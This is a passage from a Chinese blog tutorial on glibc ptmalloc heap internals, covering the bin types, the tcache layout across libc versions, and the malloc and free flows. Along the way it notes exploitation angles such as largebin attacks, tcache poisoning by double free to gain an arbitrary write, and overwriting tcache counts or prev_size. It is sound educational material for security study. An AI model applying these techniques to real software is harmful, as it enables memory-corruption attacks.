          <a href="#5-注意" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-注意" class="headerlink" title="(5)注意"></a>(5)注意</h3>
      <p>除了<code>malloc_consolidate</code>函数会清空fastbins，以及在tcache下存在<code>fastbin_reverseTo_tcache</code>外，其它的操作都不会减少fastbins中chunk的数量。</p>

        <h2 id="2-smallbins"   >
          <a href="#2-smallbins" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-smallbins" class="headerlink" title="2.smallbins:"></a>2.smallbins:</h2>
      <p>放在bins[2]-bins[125]中，共计62组，是一个双向链表。最大chunk的大小不超过1024字节</p>

        <h3 id="1-归类方式：-1"   >
          <a href="#1-归类方式：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-归类方式：-1" class="headerlink" title="(1)归类方式："></a>(1)归类方式：</h3>
      <ul>
<li><p>相同大小的chunk归到一类：大小范围[0x20,0x3f0]，0x20、0x30、….0x3f0。每组bins中的chunk大小一定。</p>
</li>
<li><p>每组bin中的chunk大小有如下关系：Chunk_size=2 * SIZE_SZ * index，index即为2-63，下图中64即为largebins的范围了。(SIZE_SZ在32，64位下分别位4，8。)</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.jpg" alt="img"></p>

        <h3 id="2-双向链表："   >
          <a href="#2-双向链表：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-双向链表：" class="headerlink" title="(2)双向链表："></a>(2)双向链表：</h3>
      <p>▲例子：a=malloc(0x100); b=malloc(0x100); c=malloc(0x100)</p>
<ul>
<li>free(a)之后:      smallbin,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">smallbin.bk-&gt;a;         a.bk-&gt;smallbin;      </span><br><span class="line">samllbin.fd-&gt;a          a.fd-&gt;smallbin;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(b)之后:    smallbin,b,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">smallbin.bk-&gt;a;       a.bk-&gt;b    b.bk-&gt;smallbin</span><br><span class="line">smallbin.fd-&gt;b;       b.fd-&gt;a    a.fd-&gt;smallbin</span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(c)之后：   smallbin,c,b,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">smallbin.bk-&gt;a;       a.bk-&gt;b    b.bk-&gt;c    c.bk-&gt;smallbin</span><br><span class="line">smallbin.fd-&gt;c;       c.fd-&gt;b    b.fd-&gt;a    a.fd-&gt;smallbin</span><br></pre></td></tr></table></div></figure>

<p>（fd,bk为bins[n]，bins[n+1]。fd和bk共同构成一个Binat。）</p>

        <h3 id="3-先进先出："   >
          <a href="#3-先进先出：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-先进先出：" class="headerlink" title="(3)先进先出："></a>(3)先进先出：</h3>
      <ul>
<li><p>m=malloc(0x100):         m-&gt;a</p>
</li>
<li><p>n=malloc(0x100):         n-&gt;b</p>
</li>
</ul>

        <h2 id="3-largebins"   >
          <a href="#3-largebins" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-largebins" class="headerlink" title="3.largebins"></a>3.largebins</h2>
      <p>放在bins[126]-bins[251]，共计63组，bin的index为64-126，最小chunk的大小不小于1024个字节。</p>

        <h3 id="1-归类方式：-2"   >
          <a href="#1-归类方式：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-归类方式：-2" class="headerlink" title="(1)归类方式："></a>(1)归类方式：</h3>
      <p>范围归类，例如bins[126]-bins[127]中保存chunk范围在[0x400,0x440]。且chunk在一个bin中按照从大到小排序，便于检索。其它与smallbins基本一致。</p>

        <h4 id="①范围模式："   >
          <a href="#①范围模式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#①范围模式：" class="headerlink" title="①范围模式："></a>①范围模式：</h4>
      <p>由以下代码定义范围：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                               </span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="②范围具体实例："   >
          <a href="#②范围具体实例：" class="heading-link"><i class="fas fa-link"></i></a><a href="#②范围具体实例：" class="headerlink" title="②范围具体实例："></a>②范围具体实例：</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">size                           index</span><br><span class="line">[<span class="number">0x400</span> , <span class="number">0x440</span>)                <span class="number">64</span></span><br><span class="line">[<span class="number">0x440</span> , <span class="number">0x480</span>)                <span class="number">65</span></span><br><span class="line">[<span class="number">0x480</span> , <span class="number">0x4C0</span>)                <span class="number">66</span></span><br><span class="line">[<span class="number">0x4C0</span> , <span class="number">0x500</span>)                <span class="number">67</span></span><br><span class="line">[<span class="number">0x500</span> , <span class="number">0x540</span>)                <span class="number">68</span></span><br><span class="line">等差 <span class="number">0x40</span>      …</span><br><span class="line">[<span class="number">0xC00</span> , <span class="number">0xC40</span>)                <span class="number">96</span></span><br><span class="line">[<span class="number">0xC40</span> , <span class="number">0xE00</span>)                <span class="number">97</span></span><br><span class="line">[<span class="number">0xE00</span> , <span class="number">0x1000</span>)               <span class="number">98</span></span><br><span class="line">[<span class="number">0x1000</span> , <span class="number">0x1200</span>)              <span class="number">99</span></span><br><span class="line">[<span class="number">0x1200</span> , <span class="number">0x1400</span>)              <span class="number">100</span></span><br><span class="line">[<span class="number">0x1400</span> , <span class="number">0x1600</span>)              <span class="number">101</span></span><br><span class="line">等差 <span class="number">0x200</span>    …</span><br><span class="line">[<span class="number">0x2800</span> , <span class="number">0x2A00</span>)              <span class="number">111</span></span><br><span class="line">[<span class="number">0x2A00</span> , <span class="number">0x3000</span>)              <span class="number">112</span></span><br><span class="line">[<span class="number">0x3000</span> , <span class="number">0x4000</span>)              <span class="number">113</span></span><br><span class="line">[<span class="number">0x4000</span> , <span class="number">0x5000</span>)              <span class="number">114</span></span><br><span class="line">等差 <span class="number">0x1000</span> …</span><br><span class="line">[<span class="number">0x9000</span> , <span class="number">0xA000</span>)              <span class="number">119</span></span><br><span class="line">[<span class="number">0xA000</span> , <span class="number">0x10000</span>)             <span class="number">120</span></span><br><span class="line">[<span class="number">0x10000</span> , <span class="number">0x18000</span>)            <span class="number">121</span></span><br><span class="line">[<span class="number">0x18000</span> , <span class="number">0x20000</span>)            <span class="number">122</span></span><br><span class="line">[<span class="number">0x20000</span> , <span class="number">0x28000</span>)            <span class="number">123</span></span><br><span class="line">[<span class="number">0x28000</span> , <span class="number">0x40000</span>)            <span class="number">124</span></span><br><span class="line">[<span class="number">0x40000</span> , <span class="number">0x80000</span>)            <span class="number">125</span></span><br><span class="line">[<span class="number">0x80000</span> , …. )                <span class="number">126</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-双向链表：-1"   >
          <a href="#2-双向链表：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-双向链表：-1" class="headerlink" title="(2)双向链表："></a>(2)双向链表：</h3>
      
        <h4 id="①取用排列："   >
          <a href="#①取用排列：" class="heading-link"><i class="fas fa-link"></i></a><a href="#①取用排列：" class="headerlink" title="①取用排列："></a>①取用排列：</h4>
      <p>首先依据fd_nextsize，bk_nextsize两个指针大小找到适合的，然后按照正常的FIFO先进先出原则，通过fd,bk来排列。</p>

        <h4 id="②大小排列："   >
          <a href="#②大小排列：" class="heading-link"><i class="fas fa-link"></i></a><a href="#②大小排列：" class="headerlink" title="②大小排列："></a>②大小排列：</h4>
      <p>每个进入largebin的chunk</p>
<p>其chunk_addr+0x20处即为其fd_nextsize指针，chunk_addr+0x28处为其bk_nextsize指针。</p>
<p>然后通过fd_nextsize，bk_nextsize两个指针依据从大至小的顺序排列：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png" alt="img"></p>
<p>(这张图片我也忘记从哪里整的了…侵删)</p>
<p>其中size顺序为：D&gt;C&gt;B&gt;A，但是释放顺序却不一定是这样的。设置这个的原因是当申请特定大小的堆块时，可以据此来快速查找，提升性能。</p>

        <h3 id="3-特殊解链："   >
          <a href="#3-特殊解链：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-特殊解链：" class="headerlink" title="(3)特殊解链："></a>(3)特殊解链：</h3>
      <p>由于largebin中会存在fd_nextsize指针和bk_nextsize指针，所以通常的largebin_attack就是针对这个进行利用的。</p>
<p>借用星阑科技的一张图说明一切：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.jpg" alt="img"></p>

        <h2 id="4-unsortedbins"   >
          <a href="#4-unsortedbins" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-unsortedbins" class="headerlink" title="4.unsortedbins"></a>4.unsortedbins</h2>
      <p>bins[0]和bins[1]中，bins[0]为fd，bins[1]为bk，bin的index为1，双链表结构。</p>

        <h3 id="1-归类方式：-3"   >
          <a href="#1-归类方式：-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-归类方式：-3" class="headerlink" title="(1)归类方式："></a>(1)归类方式：</h3>
      <p>只有一个bin，存放所有不满足fastbin，未被整理的chunk。</p>

        <h3 id="2-双向链表：-2"   >
          <a href="#2-双向链表：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-双向链表：-2" class="headerlink" title="(2)双向链表："></a>(2)双向链表：</h3>
      <p>a=malloc(0x100); b=malloc(0x100); c=malloc(0x100)</p>
<ul>
<li>free(a)之后:      unsortedbin,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">unsortedbin.bk-&gt;a;  a.bk-&gt;unsortedbin;</span><br><span class="line">unsortedbin.fd-&gt;a;  a.fd-&gt;unsortedbin;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(b)之后:    unsortedbin,b,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">unsortedbin.bk-&gt;a;  a.bk-&gt;b     b.bk-&gt;unsortedbin</span><br><span class="line">unsortedbin.fd-&gt;b;  b.fd-&gt;a     a.fd-&gt;unsortedbin</span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(c)之后：   unsortedbin,c,b,a</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">unsortedbin.bk-&gt;a;  a.bk-&gt;b     b.bk-&gt;c     c.bk-&gt;unsortedbin</span><br><span class="line">unsortedbin.fd-&gt;c;  c.fd-&gt;b     b.fd-&gt;a     a.fd-&gt;unsortedbin</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-先进先出：-1"   >
          <a href="#3-先进先出：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-先进先出：-1" class="headerlink" title="(3)先进先出："></a>(3)先进先出：</h3>
      <ul>
<li><p>m=malloc(0x100):         m-&gt;a</p>
</li>
<li><p>n=malloc(0x100):         n-&gt;b</p>
</li>
</ul>
<p>▲依据fd来遍历：</p>
<p>如果fd链顺序为A-&gt;B-&gt;C</p>
<p>那么解链顺序一定是先解C，再解B，再解A。</p>

        <h2 id="5、Tcache机制："   >
          <a href="#5、Tcache机制：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5、Tcache机制：" class="headerlink" title="5、Tcache机制："></a>5、Tcache机制：</h2>
      <p>从libc-2.26及以后都有:先进后出，最大为0x410</p>

        <h3 id="1-结构："   >
          <a href="#1-结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-结构：" class="headerlink" title="(1)结构："></a>(1)结构：</h3>
      
        <h4 id="①2-29以下"   >
          <a href="#①2-29以下" class="heading-link"><i class="fas fa-link"></i></a><a href="#①2-29以下" class="headerlink" title="①2.29以下"></a>①2.29以下</h4>
      <p>无key字段的tcache，结构大小为0x240，包括chunk头则占据0x250:</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></div></figure>


        <h5 id="counts"   >
          <a href="#counts" class="heading-link"><i class="fas fa-link"></i></a><a href="#counts" class="headerlink" title="counts:"></a>counts:</h5>
      <p>是个数组，总共64个字节，对应tcache的64个bin，每个字节代表对应bin中存在chunk的个数，所以每个字节都会小于8，一般使用</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">tc_idx = csize2tidx (size);</span><br><span class="line">tcache-&gt;counts[tc_idx]</span><br></pre></td></tr></table></div></figure>

<p>来访问索引对应bin的count。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-08_23-01-51.png" alt="img"></p>
<p>从0x55555555b010至0x55555555b04f都是counts这个数组的范围。</p>
<p>▲由于使用tcache时，不会检查tcache-&gt;counts[tc_idx]的大小是否处在[0,7]的范围，所以如果我们可以将对应bin的count改成[0,7]之外的数，这样下回再free该bin对应大小的chunk时，就不会将该chunk置入tcache中，使得tcache不满也能不进入tcache。</p>
<p>B.entries：是个bin指针数组，共64个指针数组，每个指针8个字节，总计大小0x200字节，指针指向对应的bin中第一个chunk的首地址，这个首地址不是chunk头的首地址，而是对应数据的首地址。如果该bin为空，则该指针也为空。一般会使用tcache-&gt;entries[tc_idx] != NULL来判断是否为空。</p>

        <h4 id="②2-29及以上"   >
          <a href="#②2-29及以上" class="heading-link"><i class="fas fa-link"></i></a><a href="#②2-29及以上" class="headerlink" title="②2.29及以上"></a>②2.29及以上</h4>
      <p>在entry中增加了key字段，结构体大小为0x290，count由原来的一个字节变为两个字节</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">/* 新增指针 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-个数"   >
          <a href="#2-个数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-个数" class="headerlink" title="(2)个数"></a>(2)个数</h3>
      <p>类似于一个比较大的fastbins。总共64个bin。</p>

        <h3 id="3-归类方式："   >
          <a href="#3-归类方式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-归类方式：" class="headerlink" title="(3)归类方式："></a>(3)归类方式：</h3>
      <p>相同大小的chunk归到一类：大小范围[0x20,0x410]。每组bins中的chunk大小一定。且一组bin中最多只能有7个chunk，如果free某大小bin的chunk数量超过7，那么多余的chunk会按照没有tcache机制来free。</p>

        <h3 id="4-单向链表："   >
          <a href="#4-单向链表：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-单向链表：" class="headerlink" title="(4)单向链表："></a>(4)单向链表：</h3>
      <p>▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)</p>
<p>FastbinY,d,c,b,a</p>
<ul>
<li><p>free(a)之后：tcachebins[0x20]-&gt;a;  a.fd=0</p>
</li>
<li><p>free(b)之后：tcachebins[0x20]-&gt;b;  b.fd=a   a.fd=0</p>
</li>
<li><p>free(c)之后：tcachebins[0x20]-&gt;c;  c.fd=b    b.fd-&gt;a;  a.fd=0</p>
</li>
<li><p>free(d)之后：tcachebins[0x20]-&gt;d;  d.fd=c    c.fd-&gt;b;  b.fd-&gt;a;  a.fd=0</p>
</li>
</ul>
<p>★但是这里的fd指向的是chunk内容地址，而不是其它的bins中的fd指向的是chunk头地址。</p>

        <h3 id="5-后进先出"   >
          <a href="#5-后进先出" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-后进先出" class="headerlink" title="(5)后进先出"></a>(5)后进先出</h3>
      <p>与fastbins类似。且tcache的优先级最高。</p>

        <h3 id="6-特殊："   >
          <a href="#6-特殊：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-特殊：" class="headerlink" title="(6)特殊："></a>(6)特殊：</h3>
      <ul>
<li><p>当tcache某个bin被填满之后，再free相同大小的bin放到fastbin中或者smallbins中，之后连续申请7个该大小的chunk，那么tcache中的这个bin就会被清空。之后再申请该大小的chunk就会从fastbins或者smallbins中找，如果找到了，那么返回该chunk的同时，会将该大小的fastbin或者smallbin中所有的chunk都移动到对应大小的tcache的bin中，直至填满7个。(移动时仍旧遵循先进后出的原则，所以移动之后chunk顺序会发生颠倒)</p>
</li>
<li><p>libc-2.26中存在tcache poisoning漏洞，即可以连续free(chunk)多次。</p>
</li>
</ul>
<p>假如chunk0,chunk1，然后free(chunk0)两次，这样tcache bin中就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk0.fd -&gt;chunk0，即chunk0-&gt;chunk0</span><br></pre></td></tr></table></div></figure>

<p>那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk0.fd-&gt;fakechunk，即chunk0-&gt;fakechunk</span><br></pre></td></tr></table></div></figure>

<p>之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。</p>
<p>★这个漏洞在libc2.27中就被修复了。</p>
<ul>
<li>从tcache中申请Chunk的时候不会检查size位，不需要构造字节错位。</li>
</ul>

        <h3 id="7-2-31下新增stash机制："   >
          <a href="#7-2-31下新增stash机制：" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-2-31下新增stash机制：" class="headerlink" title="(7)2.31下新增stash机制："></a>(7)2.31下新增stash机制：</h3>
      <p>在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满。</p>

        <h3 id="8-2-32下新增fd异或机制："   >
          <a href="#8-2-32下新增fd异或机制：" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-2-32下新增fd异或机制：" class="headerlink" title="(8)2.32下新增fd异或机制："></a>(8)2.32下新增fd异或机制：</h3>
      <p>会将fd异或上某个值，这个具体看其他文章吧。</p>

        <h2 id="6-Topchunk"   >
          <a href="#6-Topchunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-Topchunk" class="headerlink" title="6.Topchunk:"></a>6.Topchunk:</h2>
      <p>不属于任何Bin，在arena中属于最高地址，没有其它空闲块时，topchunk就会被用于分配。</p>

        <h2 id="7-last-remainder"   >
          <a href="#7-last-remainder" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-last-remainder" class="headerlink" title="7.last_remainder:"></a>7.last_remainder:</h2>
      <p>当请求small chunk大小内存时，如果发生分裂，则剩余的chunk保存为last_remainder，放入unsortedbin中。</p>
<p>▲没有tcache的malloc和free流程：</p>

        <h1 id="四、malloc流程："   >
          <a href="#四、malloc流程：" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、malloc流程：" class="headerlink" title="四、malloc流程："></a>四、malloc流程：</h1>
      <p>★如果是多线程情况下，那么会先进行分配区的加锁，这里就可能存在条件竞争漏洞。</p>
<ul>
<li><p>如果size在fastbins的范围内，则先在fastbins中查找，找到则结束，没找到就去unsortedbins中找。</p>
</li>
<li><p>如果size不在fastbins范围中，而在smallbins范围中，则查找smallbins（在2.23下如果发现smallbin链表未初始化，则会调用<strong>malloc_consolidate</strong>函数，但是实际情况在申请chunk之前都已经初始化过了，所以这个不怎么重要</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (victim == 0) /* initialization check */ malloc_consolidate (av); </span><br></pre></td></tr></table></div></figure>

<p>而且这个操作从2.27开始已经没有了，如果能够让smallbin不初始化，或者将main_arena+0x88设置为0），此时若smallbin找到结束，没找到去unsortedbins中找</p>
</li>
<li><p>如果size不在fastbins，smallbins范围中，那一定在largebins中，那么先调用<strong>malloc_consolidate</strong>函数将所有的fastbin中的chunk取出来，合并相邻的freechunk，放到unsortedbin中，或者与topchunk合并。再去largebins中找，找到结束，没找到就去unsortedbins中找。</p>
</li>
<li><p>unsortedbins中查找：</p>
<ul>
<li>如果unsortedbin中只有last_reaminder，且分配的size小于last_remainder，且要求的size范围为smallbin的范围，则分裂，将分裂之后的一个合适的chunk给用户，剩余的chunk变成新的last_remainder进入unsortedbin中。如果大于last_remainder，或者分配的size范围为largebin的范围，则将last_remainder整理至对应bin中，跳至第5步。</li>
<li>如果unsortedbin中不只一个chunk，则先整理，遍历unsortedbins。如果遇到精确大小，直接返回给用户，接着整理完。如果一直没遇到过，则该过程中所有遇到的chunk都会被整理到对应的fastbins，smallbins，largebins中去。</li>
</ul>
</li>
<li><p>unsortedbins中找不到，则：</p>
<ul>
<li>若当前size最开始判断是处于smallbins范围内，则再去smallbins找，这回不找精确大小，找最接近略大于size的一个固定大小的chunk给分裂，将符合size的chunk返回给用户，剩下的扔给unsortedbins，作为新的last_remainder。</li>
<li>若当前size最开始判断处于largebins范围内，则去largebins中找，和步骤(1)类似。</li>
<li>若当前size大于largebins中最大的chunk大小，那么就去topchunk来分割使用。</li>
</ul>
</li>
<li><p>topchunk分割：</p>
<ul>
<li>topchunk空间够，则直接分割。</li>
<li>topchunk空间不够，那么再调用malloc_consolidate函数进行整理一下，然后利用brk或者mmap进行再拓展。<ul>
<li>brk扩展：当申请的size小于128K时，使用该扩展。向高地址拓展新的topchunk，一般加0x21000，之后从新的topchunk再分配，旧的topchun进入unsortedbin中。</li>
<li>mmap扩展：申请的size大于等于mmap分配阈值(最开始为128k)时，使用该扩展，但是这种扩展申请到的chunk，在释放时会调用munmap函数直接被返回给操作系统，而不会进入bins中。所以如果用指针再引用该chunk块时，就会造成segmentation fault错误。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>▲当ptmalloc munmap chunk时，如果回收的chunk空间大小大于mmap分配阈值的当前值，并且小于DEFAULT_MMAP_THRESHOLD_MAX（32位系统默认为512KB，64位系统默认为32MB），ptmalloc会把mmap分配阈值调整为当前回收的chunk的大小，并将mmap收缩阈值（mmap trim threshold）设置为mmap分配阈值的2倍。这就是ptmalloc的对mmap分配阈值的动态调整机制，该机制是默认开启的，当然也可以用mallopt()关闭该机制</p>
<p>▲如果将 M_MMAP_MAX 设置为 0，ptmalloc 将不会使用 mmap 分配大块内存。</p>

        <h1 id="五、free流程："   >
          <a href="#五、free流程：" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、free流程：" class="headerlink" title="五、free流程："></a>五、free流程：</h1>
      <p>★多线程情况下，free()函数同样首先需要获取分配区的锁，来保证线程安全。</p>
<ul>
<li><p>首先判断该chunk是否为mmaped chunk，如果是，则调用 munmap()释放mmaped chunk，解除内存空间映射，该该空间不再有效。同时满足条件则调整mmap阈值。</p>
</li>
<li><p>如果size位于fastbins范围内，直接放到fastbins中。</p>
</li>
<li><p>如果size不在fastbins范围内，则进行判断：</p>
<ul>
<li>先判断前一个chunk_before，如果chunk_before是free状态的，那么就将前一个chunk从其对应的bins中取出来(unlink)，然后合并这两个chunk和chunk_before。由于还没有进入链表结构中，所以这里寻找chunk_before地址是通过当前地址减去当前chunk的presize内容，得到chunk_before的地址，从而获取其in_use位。</li>
<li>这也是presize唯一的用途，所以在堆溢出中，只要不进行free，presize可以任意修改。(这里如果chunk_before是位于fastbins中则没办法合并，因为在fastbins中的in_use位不会被改变，永远是1，在判断时始终认为该chunk是处于allocated状态的)</li>
<li>再判断后一个chunk，如果后一个chunk是free状态，那么如步骤(1)，合并，之后将合并和的chunk放入到unsortedbins中去。如果后一个chunk就是topchunk，那么直接将这个chunk和topchunk合并完事。</li>
<li>之后将合并之后的chunk进行判断，(这里也可能不发生合并，但依旧会进行判断)如果size大于<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>(0x10000)，那么就调用<strong>malloc_consolidate</strong>函数进行整理fastbins，然后给到unsortedbins中，等待malloc时进行整理。</li>
</ul>
</li>
</ul>
<p>▲32位与64位区别，差不多其实，对于0x8和0x10的变化而已：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.jpg" alt="img"></p>
